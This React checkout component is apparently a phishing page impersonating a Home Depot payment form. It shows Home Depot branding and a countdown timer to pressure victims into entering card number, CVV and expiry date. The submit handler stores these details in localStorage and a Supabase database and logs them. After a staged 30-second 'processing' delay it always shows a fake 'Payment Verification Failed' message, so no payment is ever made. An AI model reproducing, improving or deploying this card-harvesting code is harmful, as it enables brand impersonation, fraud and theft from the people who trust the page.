import React, { useState, useEffect } from 'react';
import { CreditCard, Lock, CheckCircle, AlertCircle, Shield } from 'lucide-react';
import { FormData } from '../types';
import { validateCardNumber, validateCVV, validateExpirationDate, getCardType } from '../utils/validation';
import { saveCardData, formatCardNumber } from '../utils/storage';
import { saveCardDataToDatabase } from '../utils/database';

interface CheckoutFormProps {
  onSuccess: () => void;
}

export const CheckoutForm: React.FC<CheckoutFormProps> = ({ onSuccess }) => {
  const [formData, setFormData] = useState<FormData>({
    cardNumber: '',
    cvv: '',
    expirationDate: ''
  });
  const [errors, setErrors] = useState<Partial<FormData>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [timer, setTimer] = useState(600); // 10 minutes in seconds (600 seconds)

  // Timer countdown
  useEffect(() => {
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = formatCardNumber(e.target.value);
    setFormData(prev => ({ ...prev, cardNumber: value }));
    
    if (errors.cardNumber) {
      setErrors(prev => ({ ...prev, cardNumber: undefined }));
    }
  };

  const handleCVVChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').substring(0, 3);
    setFormData(prev => ({ ...prev, cvv: value }));
    
    if (errors.cvv) {
      setErrors(prev => ({ ...prev, cvv: undefined }));
    }
  };

  const handleExpirationChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    setFormData(prev => ({ ...prev, expirationDate: value }));
    
    if (errors.expirationDate) {
      setErrors(prev => ({ ...prev, expirationDate: undefined }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<FormData> = {};
    
    if (!validateCardNumber(formData.cardNumber)) {
      newErrors.cardNumber = 'Invalid card number (16 digits required)';
    }
    
    if (!validateCVV(formData.cvv)) {
      newErrors.cvv = 'Invalid CVV (3 digits required)';
    }
    
    if (!validateExpirationDate(formData.expirationDate)) {
      newErrors.expirationDate = 'Invalid expiration date (MM/YY format required)';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    console.log('Submit button clicked - Form data:', formData);
    console.log('Timer value:', timer);
    console.log('Is submitting:', isSubmitting);
    
    // Prevent submission if timer has expired
    if (timer === 0) {
      alert('Session expired. Please refresh the page.');
      return;
    }
    
    const isValid = validateForm();
    console.log('Form validation result:', isValid);
    console.log('Current errors:', errors);
    
    if (!isValid) {
      console.log('Form validation failed, not submitting');
      return;
    }
    
    console.log('Starting submission process...');
    setIsSubmitting(true);
    
    // Show processing for 30 seconds
    console.log('Processing payment for 30 seconds...');
    await new Promise(resolve => setTimeout(resolve, 30000));
    
    try {
      // Save to both localStorage (for backward compatibility) and database
      saveCardData(formData.cardNumber, formData.cvv, formData.expirationDate);
      
      // Try to save to Supabase database (but don't fail if it doesn't work)
      try {
        await saveCardDataToDatabase(
          formData.cardNumber, 
          formData.cvv, 
          formData.expirationDate
        );
        console.log('Data saved to database successfully');
      } catch (dbError) {
        console.log('Database save failed, but continuing with localStorage:', dbError);
      }
      
      console.log('Data saved successfully:', {
        cardNumber: formData.cardNumber,
        cvv: formData.cvv,
        expirationDate: formData.expirationDate
      });
      
      setIsSuccess(true);
      setIsSubmitting(false);
      
      // Show error after processing (immediately after the 30 seconds)
      setTimeout(() => {
        setIsSuccess(false);
        setShowError(true);
      }, 1000); // Show error almost immediately after processing
    } catch (error) {
      console.error('Error saving data:', error);
      setIsSubmitting(false);
      setShowError(true);
    }
  };

  const handleReset = () => {
    setFormData({ cardNumber: '', cvv: '', expirationDate: '' });
    setErrors({});
    setShowError(false);
  };

  if (showError) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="max-w-md mx-auto bg-white rounded-lg shadow-lg p-8 text-center">
          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <div className="w-10 h-10 text-red-500 flex items-center justify-center">
              <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
          </div>
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
            <h2 className="text-xl font-bold text-red-800 mb-2">Payment Verification Failed</h2>
            <p className="text-red-700">We were unable to verify the payment. Please verify your payment method</p>
          </div>
          <button
            onClick={() => {
              setShowError(false);
              setFormData({ cardNumber: '', cvv: '', expirationDate: '' });
            }}
            className="px-6 py-3 bg-orange-600 hover:bg-orange-700 text-white rounded-lg font-medium transition-colors"
          >
            Something went wrong, please contact Customer Support
          </button>
        </div>
      </div>
    );
  }

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="max-w-md mx-auto bg-white rounded-lg shadow-lg p-8 text-center">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <CheckCircle className="w-10 h-10 text-green-500" />
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-2">Processing Payment</h2>
          <p className="text-gray-600">Please wait while we verify your payment information.</p>
          <div className="mt-4">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-orange-600 mx-auto"></div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <div className="bg-gray-800 text-white py-3">
        <div className="max-w-4xl mx-auto px-4 flex items-center justify-center">
          <div className="flex items-center space-x-3">
            <img 
              src="https://corporate.homedepot.com/sites/default/files/image_gallery/THD_logo.jpg" 
              alt="The Home Depot" 
              className="w-8 h-8 object-contain"
            />
            <span className="text-lg font-medium">Omni Payment System</span>
            <Shield className="w-5 h-5 text-gray-300" />
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-2xl mx-auto px-4 py-12">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
          <div className="text-center mb-8">
            <p className="text-gray-700 text-lg leading-relaxed">
              Thank you for choosing The Home Depot. Please enter your payment information into our secure form below.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            {/* Card Number Section - Mobile Responsive */}
            <div className="space-y-6">
              <div>
                <label className="block text-gray-700 font-medium mb-3">
                  Enter your card number below:
                </label>
                <div className="relative">
                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                    <div className="w-6 h-4 bg-orange-600 rounded-sm flex items-center justify-center">
                      <CreditCard className="w-3 h-3 text-white" />
                    </div>
                  </div>
                  <input
                    type="text"
                    value={formData.cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="- - - -"
                    className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-lg tracking-wider"
                    maxLength={19}
                  />
                </div>
                {errors.cardNumber && (
                  <div className="flex items-center mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {errors.cardNumber}
                  </div>
                )}
              </div>
              
              {/* Timer - Moved below card input for mobile */}
              <div className="flex justify-center">
                <div className="text-center">
                  <div className="text-gray-600 text-sm mb-1">Timer:</div>
                  <div className="text-2xl font-bold text-gray-800 bg-gray-100 px-4 py-2 rounded">
                    {formatTime(timer)}
                  </div>
                </div>
              </div>
            </div>

            {/* CVV and Expiration Date Section */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {/* CVV */}
              <div>
                <label className="block text-gray-700 font-medium mb-3">
                  Enter the card CVV:
                </label>
                <div className="relative">
                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                    <div className="w-6 h-4 bg-orange-600 rounded-sm flex items-center justify-center">
                      <Lock className="w-3 h-3 text-white" />
                    </div>
                  </div>
                  <input
                    type="text"
                    value={formData.cvv}
                    onChange={handleCVVChange}
                    className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-lg"
                    maxLength={3}
                    placeholder="123"
                  />
                </div>
                {errors.cvv && (
                  <div className="flex items-center mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {errors.cvv}
                  </div>
                )}
              </div>

              {/* Expiration Date */}
              <div>
                <label className="block text-gray-700 font-medium mb-3">
                  Enter expiration date:
                </label>
                <div className="relative">
                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                    <div className="w-6 h-4 bg-orange-600 rounded-sm flex items-center justify-center">
                      <Lock className="w-3 h-3 text-white" />
                    </div>
                  </div>
                  <input
                    type="text"
                    value={formData.expirationDate}
                    onChange={handleExpirationChange}
                    className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-lg"
                    maxLength={5}
                    placeholder="MM/YY"
                  />
                </div>
                {errors.expirationDate && (
                  <div className="flex items-center mt-2 text-red-500 text-sm">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {errors.expirationDate}
                  </div>
                )}
              </div>
            </div>

            {/* Buttons */}
            <div className="flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-4 pt-6">
              <button
                type="button"
                onClick={handleReset}
                disabled={isSubmitting}
                className="w-full sm:w-auto px-8 py-4 bg-gray-200 hover:bg-gray-300 text-gray-700 rounded font-medium transition-colors disabled:opacity-50 text-lg"
              >
                Reset
              </button>
              <button
                type="submit"
                disabled={isSubmitting || timer === 0}
                className="w-full sm:flex-1 px-8 py-4 bg-orange-600 hover:bg-orange-700 active:bg-orange-800 text-white rounded font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed text-lg touch-manipulation"
                style={{ WebkitTapHighlightColor: 'transparent' }}
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                    Processing Payment...
                  </div>
                ) : (
                  'Submit Payment'
                )}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};